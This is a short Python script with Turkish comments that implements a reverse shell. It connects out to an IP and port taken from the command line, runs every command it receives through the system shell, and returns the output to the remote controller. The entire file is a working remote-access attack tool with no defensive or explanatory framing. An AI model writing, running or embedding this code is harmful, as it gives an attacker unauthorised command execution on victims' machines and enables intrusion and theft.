import socket
import subprocess
import sys

def reverse_shell(host, port):
    try:
        # Hedefe bağlanmak için socket açıyoruz
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Sunucudan gelen komutları çalıştırmak için sonsuz bir döngü başlatıyoruz
        while True:
            # Sunucudan gelen komutları al
            data = s.recv(1024)
            
            if data.decode().lower() == 'exit':
                break  # 'exit' komutu alınırsa bağlantıyı kes

            # Komutları çalıştır
            if data:
                # Komutu çalıştır ve çıktısını al
                output = subprocess.run(data.decode(), shell=True, capture_output=True)
                result = output.stdout + output.stderr
                s.send(result)  # Sonucu geri gönder

        s.close()  # Bağlantıyı kapat
    except Exception as e:
        print(f"Bağlantı kurulurken hata: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Kullanım: python a.py -host <IP> -port <PORT>")
        sys.exit(1)

    host = sys.argv[2]  # Hedef IP
    port = int(sys.argv[4])  # Hedef Port

    reverse_shell(host, port)
